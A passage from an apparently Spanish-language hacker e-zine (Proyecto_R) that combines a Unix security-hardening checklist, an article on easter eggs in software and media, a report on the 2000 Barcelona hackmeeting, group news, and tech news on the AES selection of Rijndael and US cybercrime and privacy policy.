     protocols: Base de datos con el nombre de protocolos.
     inetd.conf: Archivo de configuracion de internet.
     netgroup: Lista de grupos en la red.

E. Revisar el uso de UUCP
F. Revisar  el  FTP  anonimo.  De  estar  habilitado y  no ser  estrictamente
   necesario, deshabilitarlo.
G. Revisar el uso de TFTP.
H. Seguridad del modem:

   * Uso de tarjetas inteligentes o algun tipo de Dial-Back.
   * Usar un password adicional.
   * Mantener la lista de accesos al dia.


VIII. Seguridad de dispositivos de archivos:

A. Revise  el  directorio /dev  para  revisar que  esten  bien  seteados  los
   permisos.
B. Asegurese de que todos los dispositivos residan en el directorio /dev
C. Revise los permisos de mem, kmem y swap.
D. Los puertos UNIX deben estar con permisos de lectura para todo el mundo.
   Solamente el due~o debe tener permisos de escritura.
E. Asegurese  que   un  usuario  individual  no  sea  propietario  de  ningun
   dispositivo, excepto terminal o la impresora.


IX. Trabajos de seguridad por lotes (BATCH)

A. Revisar el crontab del root.
B. Revisar comandos AT. (revisar los permisos en at.allow, at.deny)


X. Archivos LOG:

A. Usando el comando last podemos ver los ultimos ingresos al sistema.
B. Use el comando /etc/wtmp para revisar sesiones de conexion: 
      $fwtmp < /etc/wtmp
C. Revise /usr/adm/messages para intentar fallidos de login.
D. Revise si accountig este habilitado. Se habilita con accton
E. Vea los registros de procesos de las cuentas.
   Acctcon  permite  desplegar  registros  de cualquier  archivo  que contega
   registros de cuenta.


:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

                      ..--:: 08.2/3 Easter Eggs ::--..
                                 by CHack

Cada vez que me entra la depresion, reviso mis viejas zines; esas que siempre
hacen  que  el gusano de  la curiosidad  vuelva a  moverse,  como en aquellas
epocas de mi  juventud; ahi  encontre un articulo en la Raregazz #12, escrito
por Cytorax, que realmente me intereso de sobremanera.

Ese articulo hablaba de los easter eggs o huevos de  pascua,  pero  creo  que
primero debemos empezar por entender, que son los huevos de pascua?

Segun el  Vocabulario  de  ordenadores  e  Internet  de  Jose  Antonio Millan
(jamillan.com/v_index.htm), se define a los Easter Eggg como  "un  contenido,
por lo general humoristico, oculto dentro de un programa de  amplia difusion,
y al que solo se puede acceder por un procedimiento secreto. Como es  logico,
son los programadores quienes han creado y escondido estos materiales, a modo
de firma secreta"

Ahora el incluir trozos de codigo en los programas principales, en los que se
incluye la incognita de los programadores o el sello humoristico de cada uno,
practicamente se ha vuelto una costumbre y se puede decir que un programa que
no tenga alguna funcion oculta, pues ya perdio una parte de su encanto.

Realmente, se  desconoce cual fue el primer huevo de pascua que fue insertado
en algun programa informatico, pero al  parecer desde los  primeros cartuchos
de atari 2600 ya se  incluian, e  inclusive  en las viejas commodore y amigas
aparecian con bastante frecuencia este tipo de trucos.

Rara vez las compa~ias han hablado del tema, algunas inclusive se muestran en
contra  de este  tipo  de actividades,  se~alando que esos "chistes"  podrian
afectar  la  eficiencia  del  programa,  y que  seria preferible  utilizar el
espacio que ocupan los pascuales en mejoras para el programa, pero  lo cierto
es que  con permiso o no,  los programadores siguen dejando su huella para la
posteridad.

Ahora  ya no  solo  se  encuentran los  huevos  de  pascua  en el software de
ordenadores, sino que inclusive los encontramos en  el  hardware,  peliculas,
libros, musica, DVD´s, telefonos celulares, calculadoras personales,  cabinas
de telefonicas  e  inclusive  hasta  en  tu  tamagochi  como  se  muestra  en
members.es.tripod.de/Anquises/curiosidades.htm.

Me  he  encontrado  que  existen  diversas  paginas donde se  habla de  estos
secretos,         como           son                   www.eggheaven2000.com,
www.cnet.com/Content/Features/Howto/Eggs/index.html,
members.xoom.com/Tayra/ee.html y  bueno muchisimas mas ,pero al parecer todas
se copian entre si los trucos;  pero la pagina mas documentada sobre  el tema
(www.eeggs.com),  cuenta  ya  con un catalogo de mas de tres mil, que abarcan
campos como software,  hardware,  peliculas, musica, arte o libros; ademas de
que  tiene  una  especie  de  medidor, en el que indica que tan dificil es de
obtenerlo.

Organizaciones     como     las     siguientes:      www.ycgroup.com/egghunt,
www.kraftfoods.com/html/features/easter/virtu_hunt.html                     y
www.oz.net/~annien/annie_easter_fun/easter_begin_search.html, realizan en sus
paginas "cacerias" de huevos  de pascua, en  los  que  el  participante  debe
saltar de pagina en pagina para conseguir su premio.

Sabemos que tambien les ha dado a  las  casas  cinematograficas,  por incluir
escenas detras  de camaras o pistas de musica ocultas dentro de las peliculas
DVD, y hasta en algunas peliculas agregas huevos de pascua con  se~alizacion,
(yo creo que es con el fin de evitar la fatiga), ya que dan pistas como en la
caso   de   Matrix  para   acceder  a  esas   escenas  escondidas,   avisando
repentinamente  con  un  conejo  blanco donde esta el huevito, si  desean mas
informacion la pueden encontrar en: 
http://www.dvdresource.com/features/eggs.shtml   http://dvd.ign.com/eggs.html
y http://www.dvdeastereggs.com/

Cosas  como el  Hardware  no escapan a la habilidad de sus dise~adores,  y su
imaginacion no tiene limite para incluir  estos  artilugios, ya  que  tambien
podemos encontrarlos  en  las Palm donde se reportan algunos huevos de pascua
(www.lacompu.com/palm/trucos.php3                                           y
skyscraper.fortunecity.com/sql/916/undoc.html); o en las calculadoras HP, que
tambien tiene su  historia  (www.hpcalc.org/hp48/docs/hpedia/espanol.html), y
hasta  en  los scanner  HP  (www.htsoft.com/easter/)  podemos  encontrar  que
tambien tienen su pascualito incluido.

Hubo un tiempo en que yo pense que mi equipo DVD (el de escritorio) estaria a
salvo de  los  easter eggs,  pero no;  algunos modelos de DVD (como el que yo
tengo, jeje),  mediante su control remoto pueden cambiar la region con la que
fueron disenados;  la pagina donde encontre eso se las puedo decir en privado
;o)

antes de terminar, les comento que los huevos de pascua no solo se dan en los
instrumentos con los que interactua el usuario, tambien en algunas peliculas,
encontramos algunos detalles que nos hablan de sus creadores, tal es el  caso
de la amenaza fantasma en donde algunas escenas o  nombres se  puede apreciar 
la mano   de   George   Lucas     o     de     los     artistas     de    ILM
(loresdelsith.unicyber.org/trp6/imagenes/pascua/c_pascua.htm)

cabe aclarar  que  algunos  incluso senalan que el propio Bill Gates tiene su
propio huevo de Pascua incluido y que si aplicamos la tabla  ASCII y  hacemos
una serie de operaciones matematicas obtendremos el numero 666; o sea, que el
due~o de microsoft no solo es el hombre mas rico del mundo sino tambien es un
hijo del averno (www.mundolatino.org/manoamano/pascua.htm).

kilos y  kilos  de paginas con estos trucos los podemos encontrar en la Inet,
sin    embargo      les       recomiendo       visiten       la        pagina
www.orionis.com.mx/tallerdelphi/td03_3.htm,   donde  explican   mediante   un
ejemplo muy detallado, la forma en que  se puede  hacer un  huevo de estos en
codigo en delphi,  o que acudan  a las paginas de algunos de los cazadores de
estos,        como    Pogue     (www.pogueman.com),        Jamie     Zawinski
(people.netscape.com/jwz/index.html)         o           David    Nagy-Farkas
(www-leland.stanford.edu/~davidnf/)


. Por cierto, en este articulo yo tambien he puesto mi huevo de pascua.


:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

                 ..--:: 08.3/3 Cronica del hmBCN '2000 ::--..
                                   by TnK

Durante el fin de semana del 20 al 23 de Octubre, se celebro en Barcelona, el
hmBCN00.  Partiendo con  mucha ilusion  y fuerza, un  grupo  de personas,  de
manera  voluntaria, se preparan  para montar  un encuentro de hackers a nivel
internacional. Ante la falta de  medios y la intencion de hacer independiente
el evento, se decide, hacer el hackmeeting en un enorme centro social okupado
de  Barcelona,  llamado  "Les Naus",  sin publicidad,  ni  patrocinadores, ni
organismos oficiales. En fin,  algo totalmente libre y  montado por tod@s los 
que  quisieron  participar.  Con motivo  de hacerse  en  este sitio,  algunos 
miembros de  la  escena hack,  y en  particular el grupo  espa~ol !Hispahack, 
crearon  polemica al  pensar que  no seria  recomendable  mezclar  politica y 
hacking, lo cual supuso el abandono de la participacion que este  grupo tenia 
pensado hacer.  Se creo una fuerte  polemica en la mailing list del hmBCN00 y 
se lanzaron feas acusaciones que no ayudaron en nada, y  por poco se parte la
lista y se  suspende el acto.  A pesar de  este contratiempo,  todo siguio su 
curso  y  al  final,  el  hackmeeting  fue todo un exito.  Varios  cientos de 
personas   pasaron  por  "Les  Naus"  y  tambien  la  brigadilla  de  delitos 
informaticos de la Guardia Civil, de camuflaje y  aunque nadie les vio, tod@s
sabiamos que estaban...

Durante tres dias, convivimos alli, gente de muchas partes del Estado espa~ol
de Alemania, Italia, EEUU, etc. No hubo ningun problema y se dieron charlas y
talleres  de  cantidad  de  temas.  Como coincidian  los horarios,  no  habia 
posibilidad de ver todas las charlas y habia que elegir...
Entre las mas  destacables, estan la de  patentes del software, a cargo de un
editor de "Barrapunto" donde  se destaco el peligro y la  necesidad de luchar
contra este asunto, Artivismo,  por el grupo  Fiambrera obrera y RTMark  como 
forma  de  juntar  el arte  y la  protesta,  el debate  hacking  y  medios de 
comunicacion  donde  estaban  los  responsables   y  corresponsales   de  los 
principales periodicos oficiales  que tratan el tema  de la informatica,  que 
reconocieron que los que hacen la noticia, dan una vision real,  de lo que es 
un hacker, pero que  luego sus  jefes la cambian  en busca de un  titular mas 
llamativo con la consiguiente criminalizacion  de este arte,  cosa que se les 
echo poco en cara en ese debate, donde ademas  nos invitaban a descubrirnos y 
"salir  del  ghetto"  con el fin  de explicar al  mundo quienes o que somos y 
ellos hacer su buen reportaje, je, je, je!

Tambien  se dio una  interesante charla  sobre ciberdelito, policia y derecho
penal, que planteo la posible ilegalidad de condenar la intrusion informatica,
desde el punto de vista juridico. Tambien otros temas de interes como Echelon
(Sistema de espionaje digital a nivel mundial), la mecanica cuantica aplicada
a los ordenadores, GNUtella, FreeNet, tarifa plana, algoritmos de cifrado RSA
(muy buena), PGP y otras muchas desde  el viernes  a las 17.00  de la  tarde, 
hasta las 14.00 del domingo.
Por otro lado, los talleres fueron de lo mejor, un  curso practico de cabinas
telefonicas, a cargo de un miembro de SET,  instalacion de la  ultima version 
de Debian  GNU/linux en varias maquinas,  criptografia,  remailers anonimos y 
hasta  analisis de  redes, etc.  Tambien se presentaron el grupo  CPSR-Spain, 
sindominio.net, y un nuevo grupo de hackers llamado outlimit.
Todo  fue  muy  bien,  ademas  habia  un  cuarto para la red,  donde a menudo 
entraban y salian maquinas, unas 15 permanentemente  con conexion a  Internet 
desde donde se informaba a la gente que no pudo ir, como iba el encuentro.

Creo que ha  sido una  experiencia  muy positiva,  ya que  nos ha  obligado a
abrirnos al resto de la gente que alli habia,  preguntar,  aprender y cambiar 
impresiones. A pesar de que  facilmente, por alli no  habia ningun "hacker de
verdad"   como  se  dijo   en  la  lista,  no  se  ha  dependido  de  grandes 
multinacionales ni de ningun mecenas para llevar a cabo este acto y dentro de 
su  modestia,  lo  principal  es que  lo hemos pasado  muy bien.  Me llamo la 
atencion, la gran cantidad de chicas que se dejaron ver por "Les Naus",  otra 
cosa positiva mas, o acaso el hacking es solo cosa de chicos??

Ojala el a~o que viene, nos quitemos prejuicios y venga mas gente... Por alli
nos veremos... Animo Roxu, Mercè, Miquel, Alejo y demas familia.


:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

                        ..--:: 09. Noticias CDLR ::--..
                                   by Mr.Nexus
                                   
  Durante este tiempo sin saber de nosotros hemos trabajado duramente (ejem!)
en varios  proyectos que  teniamos por ahi  colgados. Lo  mas visible  es  la
inauguracion  del  nuevo  dominio   nt.cdlr.org  dedicado  enteramente  a  la 
seguridad bajo este SO. Espero que sobre decir que  esperamos  colaboraciones 
de todos vosotros en forma de programas,  sugerencias,  articulos...  y demas 
cosas que se os ocurran.

  En este subdominio estamos volcando los nuevos  descubrimientos de CDLR  en
materia  de I+D  buscando  vulnerabilidades  por ahi.  Ya tenemos  un  par de
advisories escritos, asi que pasaos por la web a ver que os parecen :)

>--[RC5]

  Tambien seguimos dando ca~a al proyecto del RC5, que por cierto tenemos que
agradecer a todos  los que estan apuntados a nuestro  grupo mandando bloques, 
todos estos:

     plaxius@xxxx.com			Desintegrator0@xxxx.net
     u_taker@xxxx.com			cd1999@xxxx.net
     chack@xxxx.com			glymar@xxxx.cl
     hackman_cl@xxxx.com		Luis Ernesto
     net-bit@xxxx.com			gualtrapa73@xxxx.com
     fcohico@xxxx.com			tspspark@xxxx.com
     jortiz@xxxx.com.mx			hr_cl@xxxx.com
     follotron@xxxx.com			elgrillo@xxxx.net
     Participant #265,711		punkyx@xxxx.cl
     kion@xxxx.org			franc6@xxxx.com
     mrnexus@xxxx.com			andykhack@xxxx.com
     rc5proyect@xxxx.net		bakan@xxxx.cl

  Si todavia no sabes que es esto del RC5, proyecto Bovine,  bloques enviados 
y demas, puedes informarte en http://www.cdlr.org/proyectos.htm donde tambien 
esta la informacion necesaria para apuntarse a nuestro equipo, el 10377.

 http://stats.distributed.net/rc5-64/tmsummary.php3?team=10377


>--[MK Linux]

  El proyecto de distribucion de cd's de linux sigue adelante con exito, si 
quieres colaborar con cd's virgenes, haciendo copias, o si necesitas alguna
distribucion puedes ponerte en contacto con nosotros en el mail 
proyecto_r@bigfoot.com y ya veremos que podemos hacer.


>--[Seguridad-NT]

 La lista que tenemos sobre Seguridad en Windows NT sigue en pie, tienes 
informacion acerca de ella en http://nt.cdlr.org/proyectos.htm

 Si quieres subscribirte manda un mail vacio a la siguiente direccion: 
		seguridad-nt-subscribe@egroups.com
 Deberas confirmar la subscripcion respondiendo el mail que se te enviara
desde EGroups y ya estaras dentro.

>--[Proyecto_R 11]

  Bueno, ... depende de vosotros, si enviais articulos, mails, colaboraciones
  ... el zine saldra antes, si no lo haceis, tardara mas.

  Pero si quereis enviar algun articulo debeis seguir ciertas reglas basicas:
  
  - Debe  estar  formateado a  78 columnas, ni una mas.  Es realmente molesto
    quemar horas formateando textos, si cada uno formatea su propio articulo, 
    pues mucho mejor.
  - Sin  faltas  de  ortografia,  esto  es  muy  importante,  hemos  recibido
    autenticas  joyas  en  cuanto  a ortografia se refiere.  No se  publicara
    ningun articulo mal escrito, con faltas graves ....
  - Si enviais articulos muy grandes, no los envieis por partes, hacedlo todo
    de una vez y nosotros seremos los que lo dividamos, o no, en capitulos.


:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-


           ..--:: 10. Noticias del Mundo del Espectaculo ::--..
                              by Mate & TnK

MACROMEDIA Y HEARME OFRECEN INTERACTIVIDAD BASADA EN VOZ PARA LA WEB
--------------------------------------------------------------------

  A fines de  la semana pasada,  Macromedia -el proveedor lider de soluciones
para crear paginas web efectivas y de alto impacto- y HearMe, una compa~ia de
vanguardia en  tecnologias avanzadas para comunicacion de voz en tiempo real,
dieron  a conocer  el uso conjunto de  sus tecnologias multimedia  para hacer
posible  el  sitio del  reconocido actor  y comediante  norteamericano  Wayne
Brady, estrella del programa "Whose Line Is It Anyway?" de la cadena ABC.

El site de Wayne Brady es un sitio-comunidad para los fanaticos de este actor
y cuenta  con salones de  chat multiusuario  compatibles con voz que permiten
que Brady  presente  improvisaciones  dinamicas  e  interactivas  manipuladas
gracias a la informacion introducida en tiempo real por el usuario.

De  esta  forma,  la  pagina  permite  que  cientos  de  miles  de visitantes
establezcan  conversaciones  y  escuchen  la  voz de  Brady  en  tiempo real.
Simultaneamente,  el actor  puede controlar  una representacion animada de si
mismo que puede visualizarse en la pantalla de cada uno de los visitantes.

Este  sitio utiliza  contenido de Shockwave  de Macromedia optimizado  con la
tecnologia   VoiceXTRA  de  HearMe  para   distribuir  los  salones  de  chat
compatibles con voz, los eventos improvisados y una serie de juegos online.

"La  tecnologia de  Macromedia y HearMe  me permite comunicarme personalmente
con mis fanaticos online,  conservado en todo momento la interactividad de un
evento en vivo", comento Wayne Brady. 

[NdE: ¿ No os suena  esto a esos  anuncios donde las grandes super top-models
      nos dicen que  con la nueva mascara de ojos de Margaret AsKor todos los
      hombres las miran con ojos de lascivia y deseo ? ]

El sitio fue desarrollado por Zeek Interactive y cuenta ademas con un espacio
de  chat  donde  los  miembros  del  sitio  pueden  comunicarse e interactuar
utilizando voz.

"Wayne  Brady es  mejor conocido  por su habilidad de  improvisar en vivo, lo
cual  fue  un  reto  al crear  este sitio  ya que  teniamos  que  llevar  las
caracteristicas  de inmediatez  e intimidad de un evento comico improvisado a
la Web",  se~alo  Steve Zehngut,  presidente de  Zeek Interactive.  "Con  las
tecnologias de  Shockwave  de  Macromedia  y  de voz  de HearMe, los usuarios
online  pueden  interactuar  con Brady,  escuchar su  voz en  tiempo  real  y
observar  una representacion  online del mismo Brady para aumentar la calidad
de su improvisacion."

La  interaccion  utilizando  voz  es  posible gracias  a  la  combinacion del
Director 8 Shockwave Studio de Macromedia, el Reproductor Shockwave Player de
Macromedia  y  VoiceXTRA  de HearMe,  que juntos  forman  la  unica  solucion
integral  disponible en  el mercado  para las  comunidades multimedios online
compatibles con voz.


PRESENTAN UN MOUSE QUE PERMITE "SENTIR" LAS PAGINAS WEB
-------------------------------------------------------

  En el dia de ayer,  la compa~ia Logitech  dio a conocer los flamantes iFeel
Mouse y iFeel MouseMan, los primeros dispositivos de este tipo que transmiten
vibraciones  a las personas  al realizar scrolls sobre un link en las paginas
web o al colocar el cursos sobre los menues que abren ventanas.

A partir  de mediados de  septiembre,  los consumidores podran -en el mercado
norteamericano-  adquirir ambos mouse  en negocios y en  la pagina  web de la
empresa fabricante.

Tal cual informo la compa~ia,  el iFeel Mouse  -tanto para derechos como para
zurdos-  tendra tres botones y  su precio de venta sera de 39,95 dolares. Con
un dise~o mas estilizado y un cuarto boton para el pulgar de los derechos, el
iFeel MouseMan costara 59,95 dolares.

"Esta es una categoria totalmente nueva dentro de los aparatos de este tipo",
comento uno de  los representantes de venta de Logitech, Jan Edbrooke. "Hasta
ahora, el  mouse era utilizado  para se~alar y como boton de entrada a traves
de los clicks.  Ahora, vamos  mucho mas alla ya  que estos  flamantes  mouses
proveen un feedback gracias a las vibraciones dactilares", agrego Edbrooke.

Lo  novedoso de  estos  productos  es que  cuentan  con  un chip  optico  que
reemplaza  la bola  convencional que tienen los mouse en su base, lo que hace
que haya  mas espacio  dentro del  recipiente  plastico donde cabe un peque~o
motor. Una barra plastica le indica al motor, el cual esta atado a un peque~o
vibrador, el momento en que el cursor "aprieta" un link o un comando del tipo
pull-down.  El motor y el vibrador se apagan cuando el cursor se encuentra un
"terreno neutral",  mientras  que las  vibraciones  pueden ser desactivadas o
minimizadas si se transforman en un elemento de distraccion para el usuario.

Segun  comento  Edbrooke,  de  convertirse  en  algo  popular,  estos  nuevos
dispositivos  podrian  producir  nuevos   desarrollos  sensoriales  para  las
computadoras.  Tal  cual se~ala  el representante  de marketing  de Logitech,
muchas compa~ias relacionadas con el universo del  comercio electronico estan
trabajando en diversos software que le permiten al mouse "sentir" estructuras
o materiales, como  una forma potencial  de incrementar y mejorar la forma en
que se vende a traves de la web.


EL NUEVO ESTANDAR DE CIFRADO
----------------------------

En 1996, el Instituto Nacional de Estandares y Tecnologia (National Institute
of  Standards  and  Technology,  NIST)  dio  los   primeros  pasos   para  la 
consolidacion  de  un  Estandar  de  Cifrado  Avanzado  (Advanced  Encryption 
Standard, AES). Su objetivo fue desarrollar una especificacion para encontrar
un algoritmo de cifrado que sustituya al agonizante  DES (56  bits de  clave, 
por lo que resulta inseguro  actualmente, y dise~o  orientado a hardware, por 
lo que resulta relativamente ineficiente en software), de manera que el nuevo
algoritmo sea capaz de proteger la informacion  sensible de los  ciudadanos y 
del gobierno hasta bien entrado el siglo XXI.

Se espera  que el  algoritmo  seleccionado sea  utilizado por el  Gobierno de 
Estados Unidos y voluntariamente por el sector privado, en sustitucion de DES.
Por extension,  presumiblemente  seria  adoptado por el  resto de  paises del 
mundo.

En septiembre de 1997, se realizo  una convocatoria  para la  presentacion de
algoritmos, en la que se especificaron los siguientes criterios de evaluacion
y requisitos minimos de aceptacion:

  1. Ser publico.
  2. Ser un algoritmo de cifrado en bloque simetrico.
  3. Estar dise~ado de manera que se pueda aumentar la longitud de la clave 
     segun las necesidades. 
  4. Ser implementable tanto en hardware como en software. 
  5. Estar o bien 
       a) disponible gratuitamente, o bien 
       b) disponible bajo terminos consistentes  con la politica de  patentes 
          del Instituto Nacional  Americano de Estandares  (American National 
          Standards Institute, ANSI).
  6. Los algoritmos  que  cumplan  con los  requisitos  arriba citados  seran 
     juzgados de acuerdo con los siguientes factores: 
       a) seguridad (e.d., el esfuerzo necesario para criptoanalizarlos) 
       b) eficiencia computacional
       c) requisitos de memoria 
       d) adecuacion hardware y software 
       e) simplicidad de dise~o 
       f) flexibilidad 
       g) requisitos de licencia.

Los  algoritmos propuestos  tenian ademas  que soportar  obligatoriamente una
longitud de bloque de 128 bits y una longitud de clave de  128, 192 y 256, al 
margen de cualesquiera otras  longitudes posibles.  La razon por la que se ha 
exigido la posibilidad de utilizar claves de 192 y 256 es que  a pesar de que 
una clave de  128 bits es  totalmente "imposible"  de reventar probando todas 
las  posibles  combinaciones  con  los recursos  computacionales actuales, no 
puede  asegurarse  que  en  un  futuro  proximo  el  estado  del  arte  de la 
computacion no vaya a permitir reventar claves  de esa longitud.  Dado que el
estandar se desea que pueda utilizarse hasta  bien entrado el  siglo XXI, por 
lo menos hasta el a~o 2060, se debe  realizar una eleccion  conservadora. Los 
ultimos avances teoricos en computacion cuantica hacen temer  que en un plazo
breve,  si  se  construyesen  estos  ingenios,  los problemas  numericos  hoy 
considerados irresolubles en un tiempo razonable, como la factorizacion o los
logaritmos discretos, se podran resolver mucho mas rapido (en un tiempo igual
a  la  raiz  cuadrada  del empleado por  un ordenador  digital  tradicional), 
tirando  por  tierra  la  seguridad  de  los  algoritmos  criptograficos  con 
longitudes  de  claves  actuales.  La raiz cuadrada  del numero  de todas las 
claves  posibles  de 256  bits  (esto es, 2256) es  igual al numero  de todas 
claves  posibles de  128 bits  (esto es,  sqrt(2256)=2256/2=2128).  En  otras 
palabras,  asumiendo  las   velocidades  previstas,   una  maquina   cuantica 
tardaria el mismo tiempo en realizar una busqueda exhaustiva en un espacio de
claves de 256 bits que un ordenador digital actual en un espacio de claves de
128 bits, y por lo tanto se trataria de una tarea irrealizable.

Conforme a las bases de esta propuesta, en agosto de 1998 se aceptaron quince
candidatos  durante  la  Primera  Conferencia  de  Candidatos  a  AES (AES1), 
a saber:

	CAST-256
	CRYPTON
	DEAL
	DFC
	E2
	FROG
	HPC
	LOKI97
	MAGENTA
	MARS
	RC6
	RIJNDAEL
	SAFER+
	SERPENT
	TWOFISH
	
La Segunda Conferencia de Candidatos a AES (AES2) se celebro en marzo de 1999
para  discutir  los  resultados  de  las  numerosas  pruebas y  ejercicios de 
criptoanalisis realizados por la  comunidad  criptografica mundial  sobre los 
quince candidatos. Basandose en estos comentarios y analisis, NIST selecciono
cinco candidatos finalistas: MARS, RC6, Rijndael, Serpent y Twofish.

El  pasado  mes  de  abril  de  2000  se  celebro la  Tercera Conferencia  de 
Candidatos  AES  (AES3)  en  Nueva  York,  durante  la  cual  los  asistentes 
presentaron nuevos documentos de evaluacion y  criptoanalisis de los  ultimos 
cinco candidatos.

Por fin,  el 2 de  octubre deL 2000,  el NIST  anuncio el  algoritmo ganador: 
Rijndael, propuesto por los belgas  Vincent Rijmen y  Joan Daemen  (de ahi su
nombre). Rijndael es un cifrador de bloque que opera con bloques y  claves de
longitudes variables, que pueden ser especificadas independientemente  a 128, 
192 o 256 bits. El resultado intermedio del  cifrado se denomina  Estado, que 
puede representarse como un  array rectangular de  bytes de cuatro  filas. La 
transformacion que tiene lugar en cada vuelta de cifrado esta  compuesta a su
vez de cuatro transformaciones diferentes:

Sustitucion de bytes no lineal, operando independientemente sobre cada uno de
los bytes del Estado. Desplazamiento de las filas del Estado ciclicamente con
offsets  diferentes.  Mezcla de  columnas,  que se realiza  multiplicando las 
columnas del Estado modulo x4+1, consideradas como polinomios en  GF(28), por 
un polinomio fijo c(x). Adicion de la clave de vuelta, en la que se aplica al
Estado por medio de un  simple XOR. La clave  de cada vuelta se  deriva de la 
clave de cifrado mediante  el esquema de  clave. El esquema de clave consiste 
en dos operaciones:  expansion de clave  y seleccion  de clave  de  vuelta de 
cifrado.

El proceso de cifrado consta de tres pasos:  una adicion inicial de  la clave 
de vuelta, n-1 vueltas  de cifrado y una  vuelta final. Para  una descripcion 
detallada  del  algoritmo,  consultese  el  documento  de  los  autores, "AES 
Proposal: Rijndael''.

Ahora ya solo queda ejecutar  los ultimos pasos  legales y  burocraticos para 
que  el  Secretario  de  Comercio  estadounidense lo adopte como un  estandar 
federal. Todas las aplicaciones  y comunicaciones,  especialmente  bancarias, 
que hacian uso  del DES,  seran  actualizadas  paulatinamente  a Rijndael, de 
manera que antes de la primavera de 2001 se espera que de DES no quede rastro
mas que en los libros de texto. Como  el algoritmo  es publico y  no necesita 
ser  licenciado, cualquier  otro  pais  distinto de los  EEUU podra adoptarlo 
igualmente  como  estandar  en  sus propias  aplicaciones si asi  lo desea. A 
partir del proximo a~o, Rijndael pasara a formar parte de nuestras vidas.


NUEVA LEY APROBADA POR EL COMITE DE JUSTICIA DEL SENADO YANQUI
--------------------------------------------------------------

El Comite de Justicia del Senado estadounidense aprobo una  ley que clarifica
las facultades y atribuciones de la autoridad para aplicar leyes federales al
enjuiciar la intrusion  informatica y  otros delitos  informaticos.  De igual 
modo determino asignar mas fondos publicos a las agencias que  investigan tal 
segmento delictivo.

Una de las  disposiciones que fue corregida trata sobre la actual ley federal
de da~os por  5.000 dolares causados por crimenes ciberneticos. En la  actual 
ley, un delito que cause da~os por un monton menor a los 5.000 dolares no cae
bajo la jurisdiccion federal a menos  que se considere  que el crimen sea una 
amenaza a la seguridad publica,  da~e a una persona  o impida un  tratamiento 
medico. El proyecto de ley original habia eliminado el principio de los 5.000 
dolares,  por lo que  una gran variedad  de delitos  informaticos  menores se 
hubieran elevado al nivel de ofensa federal.

El  documento  corregido  retiene  el  principio  de  los  5.000 dolares para 
jurisdiccion federal cuando se trate de ataques de hackers, la propagacion de
virus  y  otros  crimenes  informaticos comunes,  pero no  clarifica como son 
calculados los 5000 dolares en da~os y limita las acciones civiles excluyendo
dise~o  o manufactura  negligente  de  hardware,  software  y  firmware. Este 
texto original  tambien  hubiera hecho  de un acceso sin  autorizacion  a una 
computadora personal un crimen federal. El comite elimino, entre otras cosas,
una  propuesta  que  habria  elevado  a  nivel   federal  abusos  o   fraudes 
informaticos  perpetrados por  empleados  gubernamentales. Tambien elimino la
intencion  de  intensificar  el  enjuiciamiento  de   menores  de   edad  que 
incurrieran en delitos informaticos.

Por otra parte,  el documento  autorizaria la  asignacion de  100 millones de 
dolares  para  el  establecimiento de un  centro nacional de  soporte tecnico 
contra el crimen cibernetico y  10 laboratorios  regionales para computadoras
forenses. Adicionalmente la nueva ley podria otorgar 5 millones  de dolares a
la division de Delitos Informaticos y Propiedad  Intelectual del Departamento
de Justicia.


PRIVACIDAD EN EEUU
------------------

El 97 por ciento de los sitios web del gobierno de los EEUU no cumple con los
cuatro  principios basicos de  privacidad que la Comision Federal de Comercio
(FTC)  ha recomendando  hacer obligatorios para todos los portales del sector
privado, segun un informe gubernamental.
De acuerdo al informe,  solo  el tres  por ciento  de  los  sitios  federales 
investigados implantaron los cuatro principios basicos de privacidad de FTC.

El reporte se~ala que aunque el  85 por ciento  de los sitios  cumple con los 
standares gubernamentales en lo concerniente a la fijacion de una declaracion
de privacidad  claramente accesible,  fallan al cumplir  con los criterios de 
FTC solo el 45 por ciento cumple  con el criterio de  "seleccion",  el 23 por 
ciento cumple  con el criterio  "seguridad", y solo  el 17 por ciento  con el 
criterio "acceso".

Treinta y dos de los  sesenta y cinco sitios  investigados fueron llamados de
"alto  impacto",  ya  que  son agencias que  manejan el  90 por ciento  de la 
interaccion del gobierno con la ciudadania.

El reporte se~alo que 24 por ciento de los sitios de "alto impacto" advertian
a los visitantes del posible uso de cookies por parte de terceros.  De estos,
21 por ciento  dijeron que  permiten la  colocacion de  cookies por  parte de 
terceros en los  discos duros  de los usuarios.  Por su parte la  Casa Blanca 
critico  el  reporte,  diciendo  que es  enga~oso y que no  toma en cuenta el 
progreso que los sitios federales han realizado.


PRIVACIDAD DEL CORREO EN LAS EMPRESAS
-------------------------------------

Los empresarios podran controlar los  "e-mails" y las llamadas telefonicas de
sus empleados de acuerdo con una decision del  Gobierno britanico de dotar de
mas libertad legal a los directivos para vigilar el rendimiento laboral.
A partir  del 24 de octubre las empresas  tendran permiso para tener  "acceso
rutinario" a los correos y a las llamadas telefonicas de sus trabajadores con
el objetivo de comprobar todo aquello que se refiera a cuestiones de trabajo.
Patricia Hewitt, Secretaria de Estado  britanico  de Internet  y de  peque~as
empresas, preciso que "no obstante las empresas tendran limitaciones legales,
como la de no poder interceptar llamadas personales sin razones justificadas".

Hewitt  puntualizo  que  resulta  dificil  equilibrar  las necesidades de las 
empresas con los derechos de cada individuo.  "Como se trata  de una cuestion 
compleja nos hemos dado tiempo para consultar con las  compa~ias y  confio en 
que la nueva regulacion se ajustara a las necesidades de todos", a~adio.

